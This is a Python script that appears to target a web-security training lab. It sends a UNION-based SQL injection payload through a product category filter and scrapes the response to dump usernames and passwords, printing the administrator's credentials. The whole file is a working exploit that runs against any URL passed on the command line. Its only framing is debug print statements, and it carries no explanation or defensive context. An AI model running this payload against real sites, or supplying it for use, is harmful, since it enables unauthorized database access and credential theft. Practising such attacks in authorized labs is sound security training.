import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'https://127.0.0.1:8080'
}

def exploit_sqli_users_tables(url):
    print("I am here")
    username = 'administrator'
    path = 'filter?category=Pets'
    print("I am next here")
    sql_payload = "' UNION SELECT NULL, username || '+' || password FROM users--"
    
    try:
        full_url = url + path + sql_payload
        print("This is the URL:", full_url)
        r = requests.get(full_url, verify=False)
        res = r.text

        if "administrator" in res:
            print("[*] Found the administrator password ...")
            soup = BeautifulSoup(r.text, 'html.parser')
            # Use the string argument to find specific text
            admin_texts = soup.find_all(string=re.compile('.*administrator.*', re.IGNORECASE))

            if admin_texts:
                # Assuming password is in the format "username:password"
               for  i in admin_texts:
                   print("this is the password ::  ", i)
               return True
            else:
                print("[*] Administrator information not found in the response")
    except Exception as e:
        print(f"[*] An error occurred: {e}")
    
    return False

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("[*] Usage: %s <url>" % sys.argv[0])
        print('[*] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()
    
    print("Dumping the list of the username and the password")
    if not exploit_sqli_users_tables(url):
        print("Nothing found")
        
